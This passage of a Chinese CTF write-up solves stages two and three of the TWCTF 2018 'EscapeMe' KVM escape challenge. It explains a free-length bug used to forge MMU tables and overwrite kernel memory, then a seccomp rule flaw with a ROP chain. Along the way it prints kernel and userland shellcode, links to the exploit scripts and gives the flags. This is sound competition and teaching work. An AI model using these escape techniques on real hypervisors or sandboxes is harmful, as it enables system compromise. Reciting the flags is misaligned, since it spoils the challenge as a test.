  2. hyper call调用到`for(i = 0 ~ len >> 12) pfree(paddr + (i << 12), 0x1000)`
这里其实只要`pfree`像内核想的这样工作的话就没问题的。
在模拟器里，`pfree(addr, len)`压根就不关心`len`（他的函数圆形是`pfree(void*))`)
所以，如果有长度为0x2000的内存addr，然后调用`munmap(addr,
0x1000)`，内核其实只把第一页unmap了，但是模拟器里，整个内存都被free了！
再说明白点的话，之前的代码大概这样：
    shellcode = asm(
            mmap(0x7fff1ffc000, 0x2000) +
            munmap(0x7fff1ffc000, 0x1000) +
            mmap(0x217000, 0x1000)
    )
在这段shellcode被执行之后，`0x7fff1ffc000 +
0x1000`还是可以被用户访问，但是已经指向了刚才映射0x217000的时候`palloc`的MMU entry了！
###  利用
如果我们能够伪造MMU表的话，那整个事情就简单了。在一些设置之后，我的0x217000映射到了物理内存0x0，也就是内核代码的地址。
现在我们只需要调用个`read(0, 0x217000+off, len)`就可以改掉内核部分了。
在模拟器里有个比较有用的hyper call调用可以把一个文件读到buffer里，用这个就可以很简单的拿到flag2.txt了。
    kernel_sc = asm('''
            mov rdi, 0
            call sys_load_file
            movabs rdi, 0x8040000000
            add rdi, rax
            mov rsi, 100
            call sys_write
            ret
        sys_write:
            mov eax, 0x11
            mov rbx, rdi
            mov rcx, rsi
            mov rdx, 0
            vmmcall
            ret
        sys_load_file:
            mov eax, 0x30
            mov ebx, 2 /* index 2, the flag2.txt */
            mov rcx, rdi /* addr */
            mov esi, 100 /* len */
            movabs rdx, 0x0
            vmmcall
            ret
            ''')
这一部分的完整脚本[在这](https://github.com/david942j/ctf-writeups/blob/master/twctf-2018/EscapeMe/exp2.py)  
Flag2:  
`TWCTF{ABI_1nc0n51573ncy_l34d5_70_5y573m_d357ruc710n}`
## EscapeMe3: 操纵世界
现在就剩最后一步了：把模拟器pwn掉。  
首先我们得先看看开了那些seccomp的规则，如果想去pwn模拟器的话。  
###  漏洞
在EscapeMe2里我们已经可以伪造MMU表了，这个阶段也会用到这个。MMU表里的物理地址record其实是在模拟器里mmap的页的offset，也就是刚好在libc-2.27.so前面的页。所以说我们有MMU表的伪造能力，就可以访问到glibc里的内存。
而且我在题放出来5分钟之内就发现了seccomp规则里有个bug，这里用到了我[吊的不行的工具seccomp-tools](https://github.com/david942j/seccomp-tools) [大笑脸]。
Seccomp-tools的模拟器清晰的告诉我们满足`args[0] & 0xff < 7`的系统调用都能用。
之后就没啥新东西了，直接pwn掉就行了。
###  利用
通过伪造MMU表我们可以做到任意内存访问，但是需要先干掉ASLR。通过读libc里的指针可以同时leak出libc的基地址和argv地址，之后就可以往栈上写ROP链了。
ROP链主要用来调用`mprotect(stack, 0x3000, 7)`然后跳到栈上的shellcode。
因为有seccomp的限制，所以在`execve`之后的syscall，比如说`open`都没法用，我们就没法起shell，所以我选择写了个`ls`的shellcode来获取`flag3`的文件名。
    asm('''
            /* open('.') */
            mov rdi, 0x605000
            mov rax, 0x2e /* . */
            mov [rdi], rax
            mov rax, 2
            xor rsi, rsi
            cdq
            syscall
            /* getdents */
            mov rdi, rax
            mov rax, 0x4e
            mov rsi, 0x605000
            cdq
            mov dh, 0x10
            syscall
            /* write */
            mov rdi, 1
            mov rsi, 0x605000
            mov rdx, rax
            mov rax, 1
            syscall
        '''))
输出：  
之后再读文件`flag3-415254a0b8be92e0a976f329ad3331aa6bbea816.txt`就可以拿到最终flag了。
[完整脚本](https://github.com/david942j/ctf-writeups/blob/master/twctf-2018/EscapeMe/exp3.p://github.com/david942j/ctf-writeups/blob/master/twctf-2018/EscapeMe/exp3.py)
Flag3:  
`TWCTF{Or1g1n4l_Hyp3rc4ll_15_4_h07b3d_0f_bug5}`
## 结论
从这个题里我学了不少KVM的知识（虽然好像对这题来说没啥卵用），然后这种一层一层逃逸的设计还是很不错的，挺好玩。
我之后还会写篇文章讲讲KVM是怎么工作的，一方面帮我自己记一下，二方面也可以作为KVM新手介绍。
再次感谢@shift_crops让我这周末玩的挺开心 😀